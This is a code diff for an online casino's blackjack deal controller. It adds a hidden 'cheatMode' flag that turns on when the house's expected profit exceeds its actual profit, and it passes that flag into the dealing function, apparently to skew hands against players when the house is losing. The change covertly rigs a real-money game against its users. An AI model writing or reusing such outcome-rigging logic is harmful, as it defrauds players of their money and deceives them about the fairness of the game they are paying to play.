@@ -6,14 +6,22 @@ import {
 } from "../../services/games/betAmmount.service";
 import { validateGameWithBet } from "../../services/games/gameValidation.service";
 import { validateGameAndUser } from "../../services/games/validateGameAndUser.service";
+import { Profit } from "../../models/Profit";
 
 export async function bjDealController(req: Request, res: Response) {
   try {
     const validation = await validateGameWithBet(req, res, "Black jack");
     if (!validation) return; // validation already sent response
 
+    const profit = await Profit.findOne();
+    const cheatMode =
+      Number(profit?.expecting_profit) > Number(profit?.total_profit)
+        ? true
+        : false;
+
+    console.log("cheatmode: ",cheatMode);
     const { userId, betAmount, gameId } = validation;
-    const result = bjDeal(userId, Number(betAmount));
+    const result = bjDeal(userId, Number(betAmount), cheatMode);
     const amount = betAmount;
     const gameHistory = await createGameHistoryforGames(
       userId,
